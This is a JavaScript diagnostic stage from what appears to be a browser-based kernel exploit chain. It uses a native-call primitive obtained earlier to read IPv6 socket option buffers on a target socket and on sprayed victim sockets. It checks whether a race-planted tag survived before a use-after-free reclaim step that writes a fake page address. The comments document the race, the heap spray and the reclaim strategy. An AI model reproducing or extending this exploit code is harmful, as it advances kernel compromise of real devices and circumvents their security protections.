// Stage D diagnostic v1 (read-only): is the race's held tag still in the
// target socket's 248-byte option buffer by the time Stage D runs?
//
// The race holds a pair only when exactly one spray socket's option buffer
// received the 8-byte arm tag at +8 (`mlo = (dce<<16)|0x985A`, `mhi = 0`).
// Stage D then frees that buffer and joins 96 victims, expecting one of them
// to reclaim the slot so the next arm writes the fake page address there.
//
// Three consecutive boots (18-20) failed Stage D with `leak=none` - the arm
// wrote nothing at all - so this probe checks the one cheap hypothesis first:
// that the tag is gone before D even starts (slot already reclaimed).
//
// getsockopt only copies into the caller's frame; nothing is allocated, so
// this cannot perturb the heap the plant depends on.
var result, n, f, dv, phase = "preflight";
var st = null;
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a)
    throw new Error("caller_missing");
  st = window.__fw14StageC;
  if (!st || typeof st.targetFd !== "number" || typeof st.dce !== "number" ||
      !Array.isArray(st.victims) || st.victims.length !== 96)
    throw new Error("stage_c_state_missing");
  var need = ["getsockopt", "getpid"];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number")
      throw new Error("wrappers_missing_" + need[mi]);
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);

  var LEN = 248, MLO = 0x43434343, MHI = 0x54545454;
  var tag = ((st.dce & 0xffff) << 16 | 0x985a) >>> 0;

  // Same layout the race uses: 8-byte header then the arm writes at +8.
  function readOpt(fd) {
    f.fill(0, 0x700, 0x800);
    dv.setUint32(0x780, LEN, true);
    var g = n.call("getsockopt",
      [fd, 41, 51, n.frameAddress + 0x700, n.frameAddress + 0x780, 0]);
    if (g.value !== 0) return { ok: false, errno: n.readErrno() };
    return {
      ok: true,
      len: dv.getUint32(0x780, true),
      mlo: dv.getUint32(0x708, true) >>> 0,
      mhi: dv.getUint32(0x70c, true) >>> 0,
      head: (dv.getUint32(0x700, true) >>> 0).toString(16) + "," +
            (dv.getUint32(0x704, true) >>> 0).toString(16)
    };
  }
  function classify(r) {
    if (!r.ok) return "e" + r.errno;
    if (r.mlo === tag && r.mhi === 0) return "TAG";
    if (r.mlo === MLO && r.mhi === MHI) return "mlo";
    return "x" + r.mlo.toString(16);
  }

  phase = "target";
  var t = readOpt(st.targetFd);
  phase = "victims";
  var v0 = readOpt(st.victims[0]);
  var v1 = readOpt(st.victims[1]);
  var v95 = readOpt(st.victims[95]);

  phase = "outcome";
  var post = n.call("getpid", []);
  var intact = post.value >= 1 && state.array[0] === state.a;
  return [{
    id: "stage_d_diag_v1",
    status: "pass",
    details: {
      target: classify(t),
      target_head: t.ok ? t.head : "-",
      target_len: t.ok ? String(t.len) : "-",
      v0: classify(v0), v1: classify(v1), v95: classify(v95),
      tag: "0x" + (tag >>> 0).toString(16),
      state: t.ok && t.mlo === tag && t.mhi === 0 ? "tag_present" : "tag_gone",
      intact: intact
    }
  }];
} catch (error) {
  return [{ id: "stage_d_diag_v1", status: "error",
            details: { phase: phase, error: String(error).slice(0, 220) } }];
}
